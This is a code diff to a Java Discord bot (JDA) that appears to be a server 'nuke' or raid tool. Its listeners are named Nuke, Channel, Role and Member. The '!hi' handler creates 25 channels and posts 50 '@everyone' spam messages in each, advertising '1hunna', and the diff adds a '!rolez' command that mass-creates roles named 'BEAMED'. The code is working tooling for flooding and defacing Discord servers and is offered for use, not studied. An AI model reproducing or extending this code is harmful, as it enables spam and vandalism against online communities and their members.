@@ -13,6 +13,10 @@ import net.dv8tion.jda.api.utils.MemberCachePolicy;
 import net.dv8tion.jda.api.utils.cache.CacheFlag;
 import org.jetbrains.annotations.NotNull;
 
+import java.io.FileNotFoundException;
+import java.util.Random;
+import java.io.File;
+import java.util.Scanner;
 import java.util.concurrent.TimeUnit;
 
 public final class Bot {
@@ -31,7 +35,7 @@ public final class Bot {
                 .enableCache(CacheFlag.FORUM_TAGS)
                 .enableIntents(GatewayIntent.GUILD_MESSAGES, GatewayIntent.MESSAGE_CONTENT, GatewayIntent.GUILD_MEMBERS)
                 // Initialize commands
-                .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create())
+                .addEventListeners(new Nuke(), new Emoji(), new Channel(), new Role(), new Member(), new Create(), new Rolez())
                 .build()
                 .awaitReady();
     }
@@ -47,8 +51,10 @@ public final class Bot {
             if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!hi")) return;
             Guild guild = event.getGuild();
 
+            // For loop to create channels
             for (int i = 0; i < 25; i++) {
                 guild.createTextChannel("gg-1hunna").queue(textChannel -> {
+                    // For loop to spam message in channels
                     for (int j = 0; j < 50; j++) {
                         try {
                             textChannel.sendMessage("@everyone" +
@@ -58,9 +64,29 @@ public final class Bot {
                                     "Discord: discord.gg/1hunna" +
                                     "\n" +
                                     "Website: https://1hunna.club").queue();
-                        } catch (Exception ignored) {}
+                        } catch (Exception ignored) {
+                        }
                     }
                 });
+            }
+            event.getMessage().delete().queue();
+        }
+    }
+
+    // Create x roles
+    private static final class Rolez extends ListenerAdapter {
+        @Override
+        public void onMessageReceived(@NotNull MessageReceivedEvent event) {
+            if (!event.isFromGuild() || !event.getMessage().getContentRaw().contains("!rolez")) return;
+            Guild guild = event.getGuild();
+
+            Random random = new Random();
+            int color = random.nextInt();
+            int colors = color + random.nextInt();
+
+            // For loop to create roles
+            for (int i = 0; i < 10; i++) {
+                guild.createRole().setName("BEAMED").setColor(colors).queue(role -> role.createCopy());
             }
             event.getMessage().delete().queue();
         }
